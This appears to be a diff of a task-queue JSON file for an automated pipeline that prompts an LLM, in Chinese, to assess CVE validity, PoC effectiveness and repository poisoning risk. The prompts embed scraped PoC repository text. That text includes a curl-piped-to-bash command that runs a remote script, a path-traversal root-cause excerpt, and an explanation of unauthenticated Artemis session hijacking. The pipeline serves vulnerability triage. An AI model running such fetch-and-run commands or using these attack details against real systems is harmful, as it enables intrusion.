IMPLIED,\nINCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A\nPARTICULAR PURPOSE, AND NONINFRINGEMENT.\n\nIN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE FOR ANY CLAIM, DAMAGES,\nOR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE,\nARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER\nDEALINGS IN THE SOFTWARE.\n\n---\n\n## 4. Limitation of Liability\n\nThe author and contributors of this Software:\n\n- Are NOT responsible for any misuse of the Software\n- Are NOT liable for any damages, losses, or legal consequences\n- Do NOT endorse or authorize any illegal or malicious use\n- Accept NO responsibility for how the Software is used, modified, or distributed\n\nUsers are solely responsible for their actions and compliance with applicable laws.\n\n---\n\n## 5. Security Research Disclaimer\n\nThis Software is intended exclusively for security research and defensive purposes.\nIt is designed to help understand vulnerabilities and improve system security.\n\nIt must NOT be used against systems without explicit written permission.\n\n---\n\n## 6. Responsibility of the User\n\nBy using this Software, you agree that:\n\n- You are legally authorized to perform all testing activities\n- You will use the Software only in controlled environments\n- You will comply with all applicable laws and regulations\n- You assume full responsibility for any consequences of your use\n\n---\n\n## 7. Termination of Use\n\nAny violation of this license automatically terminates your rights to use,\nmodify, or distribute the Software.\n\n---\n\n## 8. Final Statement\n\nThis Software is provided for ethical cybersecurity research only.\nAny misuse is strictly prohibited and is solely the responsibility of the user.\n\n---\n/tmp/e335dee0979098f0da5f89c7ad84ce41/README.md\n---\n# cve-id\n\n## Donate\n\n<table>\n  <tr>\n    <td valign=\"top\" width=\"65%\">\n      <h3>Help maintain this project</h3>\n      <p>If you find this project useful, please consider supporting its ongoing maintenance through PayPal or ABA Mobile.</p>\n      <p>❤️ <strong>១០% នៃការបរិច្ចាគរបស់អ្នក នឹងត្រូវបានបរិច្ចាគជូនមន្ទីរពេទ្យគន្ធបុប្ផា។</strong></p>\n      <p>❤️ <strong>Ten percent of every donation is contributed to Kantha Bopha Children's Hospital.</strong></p>\n    </td>\n    <td align=\"center\" valign=\"top\" width=\"35%\">\n      <strong>Choose a payment method</strong>\n      <br><br>\n      <a href=\"https://www.paypal.com/donate/?hosted_button_id=GHBZLGLY76KNA\">\n        <img src=\"https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif\" alt=\"Donate securely with PayPal\">\n      </a>\n      <br><br>\n      <a href=\"https://raw.githubusercontent.com/HORKimhab/awesome-cybersecurity-resources/refs/heads/main/data/images/aba-merchant-hkimhab.jpeg\">\n        <img src=\"https://raw.githubusercontent.com/HORKimhab/awesome-cybersecurity-resources/refs/heads/main/data/images/aba-merchant-hkimhab.jpeg\" alt=\"ABA Mobile donation QR code\" height=\"180\">\n      </a>\n      <br>\n      <sub>Scan with ABA Mobile · Click to enlarge</sub>\n    </td>\n  </tr>\n</table>\n\n## ⚡ Simple Usage\n\nRun the latest version of the external download script directly from GitHub:\n\n```bash\nbash <(curl -fsSL https://raw.githubusercontent.com/HORKimhab/collection-scripts/main/get-svn.sh)\n```\n\n> This command requires Bash and `curl`. Review the remote script before running it if you do not trust the source.\n\nUse this project only in safe and authorized environments such as:\n\n- Local virtual machines\n- Docker containers\n- Isolated lab setups\n- Authorized penetration testing environments\n\nExample setup:\n\n```bash\ngit clone <repository-url>\ncd <repository-name>\n\n# Project use python follow below\n\n# Create a virtual environment\npython -m venv venv\n\n# Activate the virtual environment\n\n# macOS / Linux\nsource venv/bin/activate\n\n\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 2,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1791300871.8668396,
+    "last_attempt": 1791319245.1531131,
+    "next_attempt": 1791319269.121154,
+    "metadata": {},
+    "task_id": "task_CVE-2026-63277_1791300871",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-103648",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-103648\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"Path traversal in image-downloader 4.3.0 allows an attacker who can control the download URL to cause downloaded response data to be written outside the configured destination directory.\", \"\\u6807\\u9898: image-downloader\\u8def\\u5f84\\u7a7f\\u8d8a\\u6f0f\\u6d1e\"], \"published_date\": \"2026-10-02T16:16:44.370\", \"last_modified_date\": \"2026-10-03T16:16:34.007\", \"cvss_score\": 9.1, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"l\", \"a\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"d\", \"e\", \"m\", \"s\", \"k\", \"i\", \"n\", \"g\", \"/\", \"i\", \"m\", \"a\", \"g\", \"e\", \"-\", \"d\", \"o\", \"w\", \"n\", \"l\", \"o\", \"a\", \"d\", \"e\", \"r\", \"/\", \"-\", \"/\", \"c\", \"o\", \"m\", \"m\", \"i\", \"t\", \"/\", \"f\", \"b\", \"4\", \"4\", \"5\", \"4\", \"3\", \"0\", \"4\", \"2\", \"7\", \"6\", \"e\", \"2\", \"4\", \"3\", \"9\", \"f\", \"b\", \"1\", \"9\", \"b\", \"9\", \"8\", \"8\", \"3\", \"6\", \"b\", \"3\", \"b\", \"a\", \"9\", \"0\", \"3\", \"b\", \"3\", \"a\", \"a\", \"e\", \"a\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"l\", \"a\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"d\", \"e\", \"m\", \"s\", \"k\", \"i\", \"n\", \"g\", \"/\", \"i\", \"m\", \"a\", \"g\", \"e\", \"-\", \"d\", \"o\", \"w\", \"n\", \"l\", \"o\", \"a\", \"d\", \"e\", \"r\", \"/\", \"-\", \"/\", \"w\", \"o\", \"r\", \"k\", \"_\", \"i\", \"t\", \"e\", \"m\", \"s\", \"/\", \"3\", \"2\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] KitPloit — PoC exploit for CVE-2026-103648 | Sploitus\n [description] Path traversal in the image-downloader npm package allows arbitrary file write. (CVE-2026-103648)\n [link] https://sploitus.com/exploit?id=KITPLOIT:TOOLS-GITHUB-ETERNULLSEC-CVE-2026-103648\n [webpage 0 end]\n[webpage 1 begin] [title] EterNullSec/CVE-2026-103648 — PoC exploit for CVE-2026-103648 | Sploitus\n [description] CVSS 6.2 for CVE-2026-103648 6.2 MEDIUM SEVERITY Version NONE VectorNONE Working code 100%confidence this exploit runs Based on 5 file (s) in the source CVE Information CVE-2026-103648 Exploit Details Modified:2026-10-03 12:04 Last Seen:2026-10-03 12:08 Reporter:EterNullSec Tags image-downloaderpath traversalarbitrary file readarbitrary file write\n [link] https://sploitus.com/exploit?id=19298C57-9D4A-5BBE-9134-22326FC9C443\n [webpage 1 end]\n[webpage 2 begin] [title] CVE-2026-103648: Image Downloader Path Traversal | CVETodo\n [description] CVE-2026-103648 is a CVSS 9.1 Path Traversal vulnerability in Demsking Image Downloader. See exploitation status, patch guidance, and technical details.\n [link] https://cvetodo.com/cve/CVE-2026-103648\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-103648: Image-Downloader Path Traversal Exposes Arbitrary File ...\n [description] The image-downloader library, specifically version 4.3.0, contains a critical path traversal vulnerability (CVE-2026-103648) allowing an attacker to write arbitrary downloaded data outside the intended destination directory. This flaw enables controlled file placement on the host system, posing a significant risk for configuration file manipulation, web shell deployment, or data exfiltration ...\n [link] https://www.thehackerwire.com/cve-2026-103648-image-downloader-path-traversal-exposes-arbitrary-file-write-vulnerability/\n [webpage 3 end]\n[webpage 4 begin] [title] CVE-2026-103648 - Path Traversal in Image-Downloader 4.3.0…\n [description] CVE-2026-103648 — Path Traversal in image-downloader Discovered by: Amirhossein Roustaei (@EterNullSec) — Eternull Security ⚠️ Educational Purposes Only This repository documents a responsibly disclosed vulnerability All PoC code is intended for authorized security research and testing in isolated lab environments only Do not use ...\n [link] https://vulmon.com/vulnerabilitydetails?qid=CVE-2026-103648\n [webpage 4 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/17fe8e5bc28127967e3e2c43cbe8263d/Dockerfile\n---\nFROM node:18-alpine\n\nLABEL maintainer=\"EterNullSec <amir@eternull.ink>\"\nLABEL description=\"CVE-2026-103648 vulnerable lab environment — FOR EDUCATIONAL USE ONLY\"\nLABEL cve=\"CVE-2026-103648\"\n\nWORKDIR /app\n\n# Copy the vulnerable app\nCOPY vulnerable-app/package.json ./\nRUN npm install --production\n\nCOPY vulnerable-app/server.js ./\n\n# Create download directory\nRUN mkdir -p /tmp/downloads\n\nEXPOSE 3000\n\nCMD [\"node\", \"server.js\"]\n\n\n---\n/tmp/17fe8e5bc28127967e3e2c43cbe8263d/LICENSE\n---\nMIT License\n\nCopyright (c) 2026 Amirhossein Roustaei (EterNullSec)\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n\n---\n\nThis repository documents security research conducted for educational and\nresponsible-disclosure purposes. The MIT license above covers the PoC code;\nit does not grant permission to use any part of this repository to attack\nsystems you do not own or do not have explicit written authorization to test.\n\n\n---\n/tmp/17fe8e5bc28127967e3e2c43cbe8263d/README.md\n---\n# CVE-2026-103648 — Path Traversal in `image-downloader`\n\n<div align=\"center\">\n\n![CVE](https://img.shields.io/badge/CVE-2026--103648-red?style=for-the-badge&logo=security)\n![CVSS](https://img.shields.io/badge/CVSS-9.1%20Critical-critical?style=for-the-badge)\n![CWE](https://img.shields.io/badge/CWE-22-orange?style=for-the-badge)\n![Package](https://img.shields.io/badge/npm-image--downloader%20%3C%204.3.1-blue?style=for-the-badge&logo=npm)\n![Status](https://img.shields.io/badge/Status-Patched%20in%204.3.1-brightgreen?style=for-the-badge)\n![License](https://img.shields.io/badge/License-MIT-lightgrey?style=for-the-badge)\n\n**Discovered by: [Amirhossein Roustaei (@EterNullSec)](https://roustaei.info) — Eternull Security**\n\n**📖 Full technical writeup: [eternull.net/posts/cve-2026-103648-image-downloader-path-traversal](https://eternull.net/posts/cve-2026-103648-image-downloader-path-traversal)**\n\n> ⚠️ **Educational Purposes Only.** This repository documents a responsibly disclosed vulnerability. All PoC code is intended for authorized security research and testing in isolated lab environments only. Do not use against systems you do not own or have explicit written permission to test.\n\n</div>\n\n---\n\n## 📋 Advisory Summary\n\n| Field | Details |\n|-------|---------|\n| **CVE ID** | [CVE-2026-103648](https://www.cve.org/CVERecord?id=CVE-2026-103648) |\n| **NVD Entry** | [nvd.nist.gov/vuln/detail/CVE-2026-103648](https://nvd.nist.gov/vuln/detail/CVE-2026-103648) |\n| **CVSS v3.1 Score** | **9.1 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H` |\n| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |\n| **Package** | [`image-downloader`](https://www.npmjs.com/package/image-downloader) (npm) by [demsking](https://gitlab.com/demsking/image-downloader) |\n| **Weekly npm downloads** | ~11,000 (~38,000/month) — [source](https://api.npmjs.org/downloads/point/last-month/image-downloader) |\n| **Affected Versions** | `< 4.3.1` (all versions including `4.3.0`) |\n| **Fixed Version** | `4.3.1` |\n| **Assigned By** | GitLab |\n| **Published** | 2026-10-02 |\n| **Reporter** | Amirhossein Roustaei ([@EterNullSec](https://roustaei.info)), Eternull Security |\n\n---\n\n## 🔬 Technical Root Cause Analysis\n\nThe vulnerability is in `image-downloader@4.3.0`'s filename-extraction logic. This is the **actual source** of the affected version (`index.js`, pulled directly from the published npm package):\n\n```js\n// image-downloader@4.3.0 — index.js (actual source, unmodified)\nmodule.exports.image = ({ extractFilename = true, ...options } = {}) => {\n  if (!options.url) {\n    return Promise.reject(new Error('The options.url is required'));\n  }\n  if (!options.dest) {\n    return Promise.reject(new Error('The options.dest is required'));\n  }\n\n  if (extractFilename) {\n    if (!path.extname(options.dest)) {\n      const url = new URL(options.url);\n      const pathname = url.pathname;\n      const basename = path.basename(pathname);          // ❌ basename BEFORE decode\n      const de\n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
+    "retry_count": 1,
+    "max_retries": 5,
+    "priority": 2,
+    "status": "pending",
+    "error_type": "client_error",
+    "last_error": "API返回空结果",
+    "created_at": 1791319230.1183507,
+    "last_attempt": 1791319240.1452677,
+    "next_attempt": 1791319250.5047476,
+    "metadata": {},
+    "task_id": "task_CVE-2026-103648_1791319230",
+    "required_result_fields": [
+      "poc_available",
+      "condition",
+      "fix",
+      "risk_level",
+      "summary",
+      "attack_vector",
+      "affected_component",
+      "poison",
+      "markdown",
+      "repo_name",
+      "repo_url",
+      "cve_url"
+    ]
+  },
+  {
+    "cve_id": "CVE-2026-57967",
+    "prompt": "\n      请根据以下漏洞信息、搜索结果和漏洞利用代码，生成一份详细的漏洞分析报告，包含有效性分析、投毒风险分析、利用方式、代码分析等内容。请注意以下几点：\n\n    **信息来源：**\n\n    *   **漏洞库信息：**\n        ```\n        {\"cve_id\": \"CVE-2026-57967\", \"sources\": [\"NVD\", \"OSCS\"], \"descriptions\": [\"An unauthenticated remote attacker can craft a CORE protocol SESSION_REATTACH packet to steal an existing session and assume ongoing execution of the previously authenticated session.\\n\\n\\n\\nThis issue affects Apache Artemis: from 2.50.0 through 2.56.0; Apache ActiveMQ Artemis: from 1.0.0 through 2.44.0.\\n\\n\\n\\nUsers are recommended to upgrade to version 2.57.0, which fixes the issue.\", \"\\u6807\\u9898: ActiveMQ Artemis \\u4f1a\\u8bdd\\u91cd\\u9644\\u8ba4\\u8bc1\\u7f3a\\u5931\\u6f0f\\u6d1e\"], \"published_date\": \"2026-09-10T05:17:01.443\", \"last_modified_date\": \"2026-09-16T01:10:22.333\", \"cvss_score\": 9.8, \"severity\": \"CRITICAL\", \"references\": [\"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \".\", \"a\", \"p\", \"a\", \"c\", \"h\", \"e\", \".\", \"o\", \"r\", \"g\", \"/\", \"t\", \"h\", \"r\", \"e\", \"a\", \"d\", \"/\", \"f\", \"x\", \"f\", \"j\", \"q\", \"r\", \"d\", \"s\", \"n\", \"k\", \"s\", \"w\", \"5\", \"f\", \"1\", \"7\", \"z\", \"s\", \"3\", \"y\", \"q\", \"o\", \"8\", \"6\", \"4\", \"l\", \"b\", \"l\", \"g\", \"v\", \"6\", \"y\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"9\", \"/\", \"1\", \"0\", \"/\", \"5\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/8aa885bc5feb74f6c2512e9346a1e7c9/README.md\n---\n# CVE-2026-57967 — Apache ActiveMQ Artemis Unauthenticated Session Hijacking (SESSION_REATTACH)\n\n![CVE](https://img.shields.io/badge/CVE-2026--57967-red)\n![Severity](https://img.shields.io/badge/severity-IMPORTANT-orange)\n![Affected](https://img.shields.io/badge/Artemis-2.50.0%20%E2%80%93%202.56.0-blue)\n![Fixed](https://img.shields.io/badge/fixed-2.57.0-brightgreen)\n![PoC](https://img.shields.io/badge/PoC-Python%20%7C%20Go-informational)\n![Ethics](https://img.shields.io/badge/use-authorized%20testing%20only-ff69b4)\n\n**English** | **[Русский](README.ru.md)** | **[中文](README.zh.md)**\n\n**Unauthenticated remote hijacking of an authenticated CORE-protocol session** in\nApache ActiveMQ Artemis **2.50.0 – 2.56.0** (and `org.apache.activemq` artifacts\n1.0.0 – 2.44.0). An attacker who can open a TCP connection to the CORE acceptor\n(default `0.0.0.0:61616`) and who knows a victim's **session name** can send a\nhand-crafted `SESSION_REATTACH` packet, and the broker transfers the victim's\nfully authenticated session — its security context, consumers, pending\ndeliveries — onto the attacker's connection. No username, no password, no TLS\nclient identity is ever checked on this path.\n\nThis repository contains a working, dependency-free Python exploit plus a Java\n\"victim\" client, and a two-broker docker lab (vulnerable 2.56.0 and fixed\n2.57.0) to reproduce the attack end-to-end.\n\n> [!CAUTION]\n> This material is provided for **authorized security research and defensive\n> testing only** (see the disclaimer at the bottom). Attacking systems you do\n> not own or operate without written permission is illegal.\n\n## The vulnerability\n\nThe CORE protocol multiplexes *channels* over one TCP connection. Channel 1 is\nthe session-management channel (`CoreProtocolManager` creates it for every\nincoming connection) and — in 2.56.0 — requires **no handshake of any kind**\nbefore use. `ActiveMQPacketHandler` dispatches four packet types there,\nincluding `REATTACH_SESSION` (type 32):\n\n```java\n// artemis-server/.../ActiveMQPacketHandler.java, tag 2.56.0\nprivate void handleReattachSession(final ReattachSessionMessage request) {\n   ...\n   ServerSessionPacketHandler sessionHandler = protocolManager.getSessionHandler(request.getName());  // by NAME only!\n   if (sessionHandler == null) {\n      response = new ReattachSessionResponseMessage(-1, false);\n   } else if (sessionHandler.getChannel().getConfirmationWindowSize() == -1) {\n      ... // DoS branch: the victim's session gets closed\n   } else {\n      // Reconnect the channel to the new connection\n      int serverLastConfirmedCommandID = sessionHandler.transferConnection(connection, request.getLastConfirmedCommandID());\n      response = new ReattachSessionResponseMessage(serverLastConfirmedCommandID, true);\n   }\n   ...\n}\n```\n\nThe handler never consults the `SecurityStore` — compare the legitimate session\ncreation path (`CREATESESSION`), which calls `server.validateUser(...)`.\n`ReattachSessionMessage` carries only a **session name** and an int. The name\nkeys `CoreProtocolManager.sessionHandlers`, so whoever knows it *becomes* the\nsession owner: `ServerSessionPacketHandler.transferConnection(...)` rebinds the\nvictim's server-side channel to the attacker's TCP connection, replays the\nchannel's unconfirmed command cache to the attacker, and from then on every\n`SESS_*` packet the attacker sends on that channel executes **with the\nvictim's authenticated security context** (browse/consume/send/ack, queue and\naddress management within the victim's permissions). Message deliveries for\nthe victim's consumers go to the attacker's socket; the victim's own\nconnection goes mute — its channel no longer exists on it.\n\n### The fix\n\nFixed in **2.57.0** by [ARTEMIS-6245](https://issues.apache.org/jira/browse/ARTEMIS-6245),\ncommit\n[`26ce5813`](https://github.com/apache/artemis/commit/26ce5813dc9d640b18f18c436801454e0192895c)\n(\"Reattachment should be disabled\"). The server handler was deleted; the\nREATTACH case now always answers `ReattachSessionResponseMessage(-1, false)`,\nand connection-level authentication was introduced with the new `CONNECT`\npacket (commit `51b06748`, \"Improve Core connection handshake\").\n\n### Affected versions\n\n- `org.apache.artemis:artemis-server` **2.50.0 – 2.56.0**\n- `org.apache.activemq:artemis-server` **1.0.0 – 2.44.0**\n\nAnnouncement: [OSS Security mirror](https://openwall.com/lists/oss-security/2026/09/10/5) ·\n[ASF advisory text](https://raw.githubusercontent.com/apache/artemis-website/main/src/security-advisories.data/CVE-2026-57967-announcement.txt)\n\n## How the exploit works\n\nThe CORE wire format is minimal, so `exploit.py` speaks it with nothing but\nthe Python standard library:\n\n```\nfirst frame of a connection is preceded by the 7-byte ASCII magic \"ARTEMIS\"\nframe = [int32 BE length][byte type][int64 BE channelID][payload]   (length = frame size - 4)\n```\n\n1. Connect to the CORE acceptor, send `ARTEMIS` + a `REATTACH_SESSION`\n   packet (type \n        ```\n\n    **你的角色：** 你是一名专业的网络安全分析师，擅长分析CVE漏洞信息。\n\n    **任务：**\n\n    1.  **CVE有效性：** 分析此CVE是否为真实存在的有效漏洞。请综合考虑CVE编号格式、漏洞描述的完整性、参考链接的存在、漏洞的技术细节等因素。\n    2.  **POC有效性：** 判断提供的POC代码是否有效，是否能实际利用此漏洞，并分析其有效性。\n    3.  **投毒风险：** 分析POC代码内容,判断此仓库中是否存在作者隐藏的投毒代码,分析结果使用百分比。务必不要把POC验证的后门代码判定为投毒代码。\n    4.  **利用方式：** 详细分析并总结漏洞的利用方式，包括攻击步骤、所需条件等。\n    5.  **代码分析：** 详细分析POC代码的工作原理、关键组件和执行流程。\n    6.  **排序优先级:** 搜索引擎结果 >  漏洞利用代码 > 漏洞库信息\n    7.  **输出内容:** 务必使用中文\n    8.  **markdown内容:** 务必使用markdown格式，包含以下部分：\n        - 漏洞概述\n        - 有效性分析\n        - 投毒风险分析\n        - 利用方式\n        - 代码分析\n    **输出格式：**  你**必须**严格按照以下 **JSON** 格式输出，**不要包含任何额外的文字、说明或前缀/后缀**。JSON中的**所有键和字符串类型的值必须使用双引号**。请务必对特殊字符进行转义。\n\n    **示例JSON:**```json\n    {\n        \"name\": \"CVE-2023-12345-ExampleApp-SQL注入\",\n        \"type\": \"SQL注入\",\n        \"app\": \"ExampleApp\", \n        \"risk\": \"高危，可能导致数据泄露和远程代码执行\",\n        \"version\": \"<= 1.0\",\n        \"condition\": \"需要网络访问和数据库端口开放\",\n        \"poc_available\": \"是\",\n        \"poison\": \"90%\",\n        \"cve_valid\": \"是\",\n        \"markdown\": \"# 漏洞概述\n\n该漏洞存在于ExampleApp的登录模块,攻击者可以通过构造恶意的SQL语句绕过身份验证...\n\n## 有效性分析\n\n根据CVE编号格式、漏洞描述的完整性、参考链接的存在等因素，该CVE是真实有效的...\n\n## 投毒风险分析\n\n该仓库存在较高的投毒风险，主要原因是...\n\n## 利用方式\n\n1.  攻击者需要网络访问权限\n2.  构造恶意的SQL语句\n3.  发送到目标系统\n4.  绕过身份验证，获取系统访问权限\n\n## 代码分析\n\n主要代码组件包括：\n- `exploit.py`: 主漏洞利用脚本\n- `payloads.py`: 包含各种SQL注入payload\n- `utils.py`: 辅助工具函数\n\n代码执行流程：\n1.  连接到目标数据库\n2.  构造恶意SQL语句\n3.  发送到目标系统\n4.  解析响应，获取敏感信息\n\",\n        \"repo_name\": \"example/repo\",\n        \"repo_url\": \"https://github.com/example/repo\",\n        \"cve_url\": \"https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-12345\"\n    }\n        ",
     "retry_count": 0,
     "max_retries": 5,
     "priority": 2,
     "status": "pending",
     "error_type": null,
     "last_error": null,
-    "created_at": 1791300871.8668396,
+    "created_at": 1791319245.9560044,
     "last_attempt": 0,
-    "next_attempt": 1791300877.255787,
+    "next_attempt": 1791319251.0691776,
     "metadata": {},
-    "task_id": "task_CVE-2026-63277_1791300871",
+    "task_id": "task_CVE-2026-57967_1791319245",
     "required_result_fields": [
       "poc_available",
       "condition",
